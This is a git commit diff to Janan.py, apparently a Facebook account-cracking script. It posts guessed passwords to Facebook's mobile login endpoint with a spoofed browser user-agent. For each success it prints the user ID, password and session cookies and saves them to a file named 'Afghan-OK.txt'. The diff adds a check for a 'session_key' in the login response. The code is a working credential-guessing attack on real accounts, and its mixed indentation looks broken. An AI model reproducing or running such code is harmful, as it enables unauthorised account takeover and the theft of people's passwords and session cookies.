7b79f3a908499adc1713f059354bad742e20e731
Gull21 <140243094+Gull21@users.noreply.github.com>
2023-07-29 13:44:28 +0430

    Add files via upload

--- Janan.py
+++ Janan.py
@@ -108,6 +108,8 @@ def rndm(ids,mking_pass):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}
 			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
+                if 'session_key' in po:
+				uid = po['uid']
 				print('\r\r\033[1;32m [Saadat-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
 				open('/sdcard/Afghan-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
